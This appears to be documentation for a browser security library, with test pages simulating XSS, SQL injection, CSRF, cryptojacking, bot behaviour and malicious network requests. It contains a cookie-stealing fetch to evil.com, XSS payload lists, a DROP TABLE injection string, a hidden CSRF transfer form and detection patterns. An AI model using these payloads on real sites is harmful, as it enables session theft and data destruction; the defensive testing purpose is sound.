# Attack Simulations

This guide provides examples of common web attacks and how Core Developer detects and prevents them. Use these examples to test your security implementation and understand threat patterns.

## Cross-Site Scripting (XSS) Attacks

### Basic XSS Attempt

```html
<!-- Test page for XSS detection -->
<div id="xss-test">
  <h2>XSS Attack Simulation</h2>

  <!-- This should be blocked by Core Developer -->
  <div id="vulnerable-div">
    <script>
      // Malicious script that should be detected
      alert('XSS Attack Successful!');
      // Attempt to steal cookies
      fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
  </div>

  <!-- Event handler XSS -->
  <button onclick="alert('XSS')">Click me</button>

  <!-- Image tag XSS -->
  <img src="x" onerror="alert('XSS via image')">

  <!-- Link XSS -->
  <a href="javascript:alert('XSS')">Malicious Link</a>
</div>

<script>
  // Initialize Core Developer
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  shield.configure({
    protectionLevel: 'strict',
    features: {
      domProtection: true,
      behaviorAnalysis: true
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ Core Developer active - testing XSS protection');

        // Listen for threat detection
        document.addEventListener('shield:threat-detected', (event) => {
          const threat = event.detail;
          console.log('XSS Threat detected:', threat);
          // Display threat information
          displayThreat(threat);
        });

        document.addEventListener('shield:threat-blocked', (event) => {
          console.log('XSS Threat blocked:', event.detail);
        });
      });
    });
  });

  function displayThreat(threat) {
    const threatDiv = document.createElement('div');
    threatDiv.className = 'threat-alert';
    threatDiv.innerHTML = `
      <h3>🚨 Threat Detected!</h3>
      <p><strong>Type:</strong> ${threat.type}</p>
      <p><strong>Severity:</strong> ${threat.severity}</p>
      <p><strong>Description:</strong> ${threat.description}</p>
      <p><strong>Time:</strong> ${new Date(threat.timestamp).toLocaleTimeString()}</p>
    `;
    document.body.appendChild(threatDiv);
  }
</script>
```

### Advanced XSS Payloads

```javascript
// Test various XSS payloads
const xssPayloads = [
  // Basic XSS
  '<script>alert("XSS")</script>',

  // Event handler XSS
  '<img src=x onerror=alert("XSS")>',

  // JavaScript URL
  'javascript:alert("XSS")',

  // Encoded XSS
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',

  // DOM-based XSS
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',

  // CSS expression (older IE)
  '<div style="width: expression(alert(\'XSS\'))">',

  // VBscript (older IE)
  '<script language="VBScript">MsgBox "XSS"</script>',

  // Data URL XSS
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',

  // Base64 encoded
  '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">'
];

function testXSSPayloads() {
  const testContainer = document.getElementById('xss-test-container');

  xssPayloads.forEach((payload, index) => {
    const testDiv = document.createElement('div');
    testDiv.className = 'xss-test-case';
    testDiv.innerHTML = `
      <h4>Test Case ${index + 1}</h4>
      <div class="payload">${payload}</div>
      <div class="result" id="result-${index}">Testing...</div>
    `;

    testContainer.appendChild(testDiv);

    // Test the payload
    setTimeout(() => {
      const resultDiv = document.getElementById(`result-${index}`);
      try {
        // This should be blocked by Core Developer
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = payload;
        document.body.appendChild(tempDiv);

        setTimeout(() => {
          document.body.removeChild(tempDiv);
          resultDiv.textContent = 'Payload executed (not blocked)';
          resultDiv.className = 'result failed';
        }, 100);
      } catch (error) {
        resultDiv.textContent = 'Payload blocked by Core Developer';
        resultDiv.className = 'result success';
      }
    }, index * 500);
  });
}

// Run tests when page loads
document.addEventListener('DOMContentLoaded', testXSSPayloads);
```

## SQL Injection Attacks

### Form-based SQL Injection

```html
<div id="sql-injection-test">
  <h2>SQL Injection Attack Simulation</h2>

  <form id="login-form">
    <div class="form-group">
      <label>Username:</label>
      <input type="text" id="username" placeholder="Enter username">
    </div>

    <div class="form-group">
      <label>Password:</label>
      <input type="password" id="password" placeholder="Enter password">
    </div>

    <button type="submit">Login</button>
  </form>

  <div class="attack-examples">
    <h3>Try these SQL injection payloads:</h3>
    <ul>
      <li>' OR '1'='1</li>
      <li>admin' --</li>
      <li>') OR ('1'='1</li>
      <li>admin'; DROP TABLE users; --</li>
      <li>UNION SELECT * FROM users</li>
    </ul>
  </div>
</div>

<script>
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  shield.configure({
    protectionLevel: 'strict',
    features: {
      domProtection: true,
      networkInterception: true,
      behaviorAnalysis: true
    },
    threatDetection: {
      customPatterns: [
        '(\\b(union|select|insert|update|delete|drop|create|alter)\\b)',
        '(\\bor\\b.*=.*\\bor\\b)',
        '(\\band\\b.*=.*\\band\\b)',
        '(\';.*--)',
        '(\';.*DROP)',
        '(\';.*SELECT)'
      ]
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ SQL Injection protection active');

        // Monitor form submissions
        document.getElementById('login-form').addEventListener('submit', async (e) => {
          e.preventDefault();

          const username = document.getElementById('username').value;
          const password = document.getElementById('password').value;

          // Validate input
          const isUsernameSafe = await shield.validateContent(username);
          const isPasswordSafe = await shield.validateContent(password);

          if (!isUsernameSafe || !isPasswordSafe) {
            alert('SQL injection attempt detected! Login blocked.');
            return;
          }

          // Simulate login (in real app, this would be an API call)
          console.log('Login attempt:', { username, password });
          alert('Login successful (simulated)');
        });

        // Listen for SQL injection threats
        document.addEventListener('shield:threat-detected', (event) => {
          const threat = event.detail;
          if (threat.type === 'injection') {
            displaySQLThreat(threat);
          }
        });
      });
    });
  });

  function displaySQLThreat(threat) {
    const threatDiv = document.createElement('div');
    threatDiv.className = 'sql-threat-alert';
    threatDiv.innerHTML = `
      <h3>🚨 SQL Injection Detected!</h3>
      <p><strong>Pattern:</strong> ${threat.description}</p>
      <p><strong>Severity:</strong> ${threat.severity}</p>
      <p><strong>Time:</strong> ${new Date(threat.timestamp).toLocaleTimeString()}</p>
      <p><strong>Action:</strong> Request blocked</p>
    `;
    document.body.appendChild(threatDiv);

    // Auto-remove after 5 seconds
    setTimeout(() => {
      if (threatDiv.parentNode) {
        threatDiv.parentNode.removeChild(threatDiv);
      }
    }, 5000);
  }
</script>
```

## Cross-Site Request Forgery (CSRF)

### CSRF Attack Simulation

```html
<div id="csrf-test">
  <h2>CSRF Attack Simulation</h2>

  <div class="banking-app">
    <h3>Mock Banking App</h3>
    <p>Balance: $1,234.56</p>

    <form id="transfer-form">
      <div class="form-group">
        <label>To Account:</label>
        <input type="text" id="to-account" placeholder="Enter account number">
      </div>

      <div class="form-group">
        <label>Amount:</label>
        <input type="number" id="amount" placeholder="Enter amount">
      </div>

      <button type="submit">Transfer Money</button>
    </form>
  </div>

  <!-- Hidden CSRF attack form (simulated) -->
  <div id="csrf-attack" style="display: none;">
    <form action="https://evil-bank.com/transfer" method="POST">
      <input type="hidden" name="from" value="victim-account">
      <input type="hidden" name="to" value="attacker-account">
      <input type="hidden" name="amount" value="1000">
    </form>
  </div>
</div>

<script>
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  shield.configure({
    protectionLevel: 'strict',
    features: {
      networkInterception: true,
      behaviorAnalysis: true,
      predictiveDetection: true
    },
    threatDetection: {
      customPatterns: [
        'csrf',
        'cross.site.request.forgery',
        'request.forgery'
      ]
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ CSRF protection active');

        // Intercept network requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options = {}) {
          // Check for suspicious cross-origin requests
          if (typeof url === 'string' && url.includes('evil-bank.com')) {
            console.log('🚨 CSRF attempt blocked:', url);
            document.dispatchEvent(new CustomEvent('shield:threat-detected', {
              detail: {
                type: 'csrf',
                severity: 'high',
                description: 'Cross-site request forgery attempt',
                source: url,
                timestamp: new Date(),
                blocked: true
              }
            }));
            return Promise.reject(new Error('CSRF attempt blocked'));
          }

          return originalFetch.apply(this, arguments);
        };

        // Monitor form submissions
        document.getElementById('transfer-form').addEventListener('submit', async (e) => {
          e.preventDefault();

          const toAccount = document.getElementById('to-account').value;
          const amount = document.getElementById('amount').value;

          // Validate transfer request
          const isSafe = await shield.validateContent(`${toAccount}:${amount}`);
          if (!isSafe) {
            alert('Suspicious transfer request detected!');
            return;
          }

          console.log('Transfer processed:', { toAccount, amount });
          alert(`Transfer of $${amount} to account ${toAccount} completed (simulated)`);
        });

        // Simulate CSRF attack after 5 seconds
        setTimeout(() => {
          simulateCSRFAttack();
        }, 5000);
      });
    });
  });

  function simulateCSRFAttack() {
    console.log('🔥 Simulating CSRF attack...');

    // This would normally be triggered by visiting a malicious site
    // For demo purposes, we'll simulate it directly
    fetch('https://evil-bank.com/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'from=victim-account&to=attacker-account&amount=1000'
    }).catch(error => {
      console.log('CSRF attack blocked:', error.message);
    });
  }
</script>
```

## Crypto Mining Detection

### Cryptojacking Simulation

```html
<div id="crypto-mining-test">
  <h2>Crypto Mining Detection</h2>

  <div class="mining-status">
    <p>CPU Usage: <span id="cpu-usage">0%</span></p>
    <p>Mining Attempts: <span id="mining-attempts">0</span></p>
  </div>

  <button id="start-mining-test">Start Mining Test</button>
  <button id="stop-mining-test">Stop Test</button>
</div>

<script>
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  let miningInterval = null;
  let miningAttempts = 0;

  shield.configure({
    protectionLevel: 'strict',
    features: {
      behaviorAnalysis: true,
      predictiveDetection: true
    },
    threatDetection: {
      customPatterns: [
        'coinbase',
        'cryptonight',
        'webmining',
        'coinhive',
        'miner',
        'mining'
      ]
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ Crypto mining protection active');

        // Monitor for mining scripts
        document.addEventListener('shield:threat-detected', (event) => {
          const threat = event.detail;
          if (threat.type === 'crypto-mining') {
            displayMiningThreat(threat);
          }
        });

        // Set up mining test buttons
        document.getElementById('start-mining-test').addEventListener('click', startMiningTest);
        document.getElementById('stop-mining-test').addEventListener('click', stopMiningTest);
      });
    });
  });

  function startMiningTest() {
    console.log('🔥 Starting crypto mining simulation...');

    // Simulate mining activity (without actual mining)
    miningInterval = setInterval(() => {
      miningAttempts++;

      // Update UI
      document.getElementById('mining-attempts').textContent = miningAttempts;
      document.getElementById('cpu-usage').textContent = Math.floor(Math.random() * 30 + 70) + '%';

      // Simulate mining script injection
      const miningScript = document.createElement('script');
      miningScript.innerHTML = `
        // Simulated mining code
        var mining = {
          start: function() {
            console.log('Mining started...');
            // This would normally start crypto mining
          }
        };
        mining.start();
      `;

      // Try to inject the script (should be blocked)
      try {
        document.head.appendChild(miningScript);
      } catch (error) {
        console.log('Mining script blocked');
      }

      // Trigger threat detection
      document.dispatchEvent(new CustomEvent('shield:threat-detected', {
        detail: {
          type: 'crypto-mining',
          severity: 'high',
          description: 'Cryptocurrency mining attempt detected',
          source: 'simulated-mining-script',
          timestamp: new Date(),
          blocked: true
        }
      }));

    }, 2000);
  }

  function stopMiningTest() {
    if (miningInterval) {
      clearInterval(miningInterval);
      miningInterval = null;
    }
    document.getElementById('cpu-usage').textContent = '0%';
    console.log('Mining test stopped');
  }

  function displayMiningThreat(threat) {
    const threatDiv = document.createElement('div');
    threatDiv.className = 'mining-threat-alert';
    threatDiv.innerHTML = `
      <h3>🚨 Crypto Mining Detected!</h3>
      <p><strong>Type:</strong> ${threat.type}</p>
      <p><strong>Description:</strong> ${threat.description}</p>
      <p><strong>Severity:</strong> ${threat.severity}</p>
      <p><strong>Time:</strong> ${new Date(threat.timestamp).toLocaleTimeString()}</p>
      <p><strong>Status:</strong> ${threat.blocked ? 'Blocked' : 'Detected'}</p>
    `;
    document.body.appendChild(threatDiv);

    // Auto-remove after 3 seconds
    setTimeout(() => {
      if (threatDiv.parentNode) {
        threatDiv.parentNode.removeChild(threatDiv);
      }
    }, 3000);
  }
</script>
```

## Behavioral Analysis Tests

### Bot Detection Simulation

```html
<div id="bot-detection-test">
  <h2>Bot Detection Simulation</h2>

  <div class="test-controls">
    <button id="simulate-human">Simulate Human Behavior</button>
    <button id="simulate-bot">Simulate Bot Behavior</button>
    <button id="stop-simulation">Stop Simulation</button>
  </div>

  <div class="behavior-log">
    <h3>Behavior Log</h3>
    <div id="behavior-entries"></div>
  </div>

  <div class="detection-results">
    <h3>Detection Results</h3>
    <p>Bot Confidence: <span id="bot-confidence">0%</span></p>
    <p>Human Confidence: <span id="human-confidence">100%</span></p>
    <p>Status: <span id="detection-status">Normal</span></p>
  </div>
</div>

<script>
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  let simulationInterval = null;
  let behaviorLog = [];

  shield.configure({
    protectionLevel: 'strict',
    features: {
      behaviorAnalysis: true,
      predictiveDetection: true
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ Behavioral analysis active');

        // Set up test controls
        document.getElementById('simulate-human').addEventListener('click', () => simulateBehavior('human'));
        document.getElementById('simulate-bot').addEventListener('click', () => simulateBehavior('bot'));
        document.getElementById('stop-simulation').addEventListener('click', stopSimulation);

        // Listen for behavior analysis
        document.addEventListener('shield:threat-detected', (event) => {
          const threat = event.detail;
          if (threat.type === 'behavior') {
            updateDetectionResults(threat);
          }
        });
      });
    });
  });

  function simulateBehavior(type) {
    stopSimulation(); // Stop any existing simulation

    const behaviors = type === 'human' ? humanBehaviors : botBehaviors;

    simulationInterval = setInterval(() => {
      const behavior = behaviors[Math.floor(Math.random() * behaviors.length)];
      executeBehavior(behavior);

      logBehavior(behavior, type);
    }, type === 'human' ? 1000 + Math.random() * 2000 : 100 + Math.random() * 200);
  }

  function executeBehavior(behavior) {
    switch (behavior.type) {
      case 'click':
        simulateClick(behavior.target);
        break;
      case 'scroll':
        simulateScroll(behavior.distance);
        break;
      case 'mousemove':
        simulateMouseMove(behavior.x, behavior.y);
        break;
      case 'keypress':
        simulateKeyPress(behavior.key);
        break;
    }
  }

  function simulateClick(selector) {
    const element = document.querySelector(selector) || document.body;
    const event = new MouseEvent('click', {
      bubbles: true,
      cancelable: true,
      clientX: Math.random() * window.innerWidth,
      clientY: Math.random() * window.innerHeight
    });
    element.dispatchEvent(event);
  }

  function simulateScroll(distance) {
    window.scrollBy(0, distance);
  }

  function simulateMouseMove(x, y) {
    const event = new MouseEvent('mousemove', {
      clientX: x,
      clientY: y,
      bubbles: true
    });
    document.dispatchEvent(event);
  }

  function simulateKeyPress(key) {
    const event = new KeyboardEvent('keypress', {
      key: key,
      bubbles: true
    });
    document.dispatchEvent(event);
  }

  function logBehavior(behavior, type) {
    const entry = {
      type,
      behavior: behavior.type,
      timestamp: new Date(),
      details: behavior
    };

    behaviorLog.unshift(entry);
    if (behaviorLog.length > 20) {
      behaviorLog = behaviorLog.slice(0, 20);
    }

    updateBehaviorLog();
  }

  function updateBehaviorLog() {
    const container = document.getElementById('behavior-entries');
    container.innerHTML = behaviorLog.slice(0, 10).map(entry => `
      <div class="behavior-entry ${entry.type}">
        <span class="behavior-type">${entry.behavior}</span>
        <span class="behavior-time">${entry.timestamp.toLocaleTimeString()}</span>
        <span class="behavior-source">${entry.type}</span>
      </div>
    `).join('');
  }

  function updateDetectionResults(threat) {
    const confidence = threat.metadata?.confidence || 0;
    const isBot = threat.description.toLowerCase().includes('bot');

    document.getElementById('bot-confidence').textContent = isBot ? `${Math.round(confidence * 100)}%` : '0%';
    document.getElementById('human-confidence').textContent = isBot ? `${Math.round((1 - confidence) * 100)}%` : '100%';
    document.getElementById('detection-status').textContent = threat.blocked ? 'Blocked' : 'Detected';

    // Add visual indicator
    document.getElementById('detection-status').className = threat.blocked ? 'blocked' : 'detected';
  }

  function stopSimulation() {
    if (simulationInterval) {
      clearInterval(simulationInterval);
      simulationInterval = null;
    }
  }

  // Behavior patterns
  const humanBehaviors = [
    { type: 'mousemove', x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight },
    { type: 'click', target: 'button' },
    { type: 'scroll', distance: 50 + Math.random() * 100 },
    { type: 'keypress', key: 'a' },
    { type: 'mousemove', x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight },
    { type: 'click', target: 'a' },
    { type: 'scroll', distance: -30 - Math.random() * 50 }
  ];

  const botBehaviors = [
    { type: 'click', target: 'button' },
    { type: 'click', target: 'button' },
    { type: 'click', target: 'input' },
    { type: 'keypress', key: 'Enter' },
    { type: 'click', target: 'button' },
    { type: 'click', target: 'a' },
    { type: 'click', target: 'button' }
  ];
</script>
```

## Network Interception Tests

### Malicious Request Detection

```html
<div id="network-test">
  <h2>Network Interception Test</h2>

  <div class="test-buttons">
    <button id="test-malicious-request">Test Malicious Request</button>
    <button id="test-legitimate-request">Test Legitimate Request</button>
    <button id="test-suspicious-payload">Test Suspicious Payload</button>
  </div>

  <div class="request-log">
    <h3>Request Log</h3>
    <div id="request-entries"></div>
  </div>
</div>

<script>
  import { ShieldFirewall } from 'shield-firewall';

  const shield = new ShieldFirewall();
  const requestLog = [];

  shield.configure({
    protectionLevel: 'strict',
    features: {
      networkInterception: true
    },
    threatDetection: {
      customPatterns: [
        'evil.com',
        'malicious-site',
        'suspicious-payload',
        'attack-vector'
      ]
    }
  }).then(() => {
    shield.initialize().then(() => {
      shield.start().then(() => {
        console.log('🛡️ Network interception active');

        // Set up test buttons
        document.getElementById('test-malicious-request').addEventListener('click', testMaliciousRequest);
        document.getElementById('test-legitimate-request').addEventListener('click', testLegitimateRequest);
        document.getElementById('test-suspicious-payload').addEventListener('click', testSuspiciousPayload);

        // Intercept fetch requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options = {}) {
          const request = {
            url: typeof url === 'string' ? url : url.url,
            method: options.method || 'GET',
            headers: options.headers || {},
            body: options.body,
            timestamp: new Date(),
            blocked: false
          };

          // Check for malicious patterns
          const isMalicious = checkRequestForThreats(request);

          if (isMalicious) {
            request.blocked = true;
            logRequest(request, 'blocked');

            document.dispatchEvent(new CustomEvent('shield:threat-detected', {
              detail: {
                type: 'network',
                severity: 'high',
                description: 'Malicious network request blocked',
                source: request.url,
                timestamp: request.timestamp,
                blocked: true
              }
            }));

            return Promise.reject(new Error('Request blocked by security policy'));
          }

          logRequest(request, 'allowed');
          return originalFetch.apply(this, arguments);
        };
      });
    });
  });

  function checkRequestForThreats(request) {
    const url = request.url.toLowerCase();
    const body = (request.body || '').toString().toLowerCase();

    // Check URL for malicious domains
    if (url.includes('evil.com') || url.includes('malicious-site')) {
      return true;
    }

    // Check body for suspicious content
    if (body.includes('suspicious-payload') || body.includes('attack-vector')) {
      return true;
    }

    return false;
  }

  function logRequest(request, status) {
    const entry = {
      ...request,
      status,
      id: Date.now()
    };

    requestLog.unshift(entry);
    if (requestLog.length > 20) {
      requestLog = requestLog.slice(0, 20);
    }

    updateRequestLog();
  }

  function updateRequestLog() {
    const container = document.getElementById('request-entries');
    container.innerHTML = requestLog.map(entry => `
      <div class="request-entry ${entry.status}">
        <div class="request-method">${entry.method}</div>
        <div class="request-url">${entry.url}</div>
        <div class="request-status">${entry.status.toUpperCase()}</div>
        <div class="request-time">${entry.timestamp.toLocaleTimeString()}</div>
      </div>
    `).join('');
  }

  async function testMaliciousRequest() {
    try {
      await fetch('https://evil.com/malicious-endpoint', {
        method: 'POST',
        body: 'malicious data'
      });
    } catch (error) {
      console.log('Malicious request blocked:', error.message);
    }
  }

  async function testLegitimateRequest() {
    try {
      const response = await fetch('https://jsonplaceholder.typicode.com/posts/1');
      const data = await response.json();
      console.log('Legitimate request successful:', data);
    } catch (error) {
      console.error('Legitimate request failed:', error);
    }
  }

  async function testSuspiciousPayload() {
    try {
      await fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: 'suspicious-payload',
          body: 'This contains attack-vector data',
          userId: 1
        })
      });
    } catch (error) {
      console.log('Suspicious payload blocked:', error.message);
    }
  }
</script>
```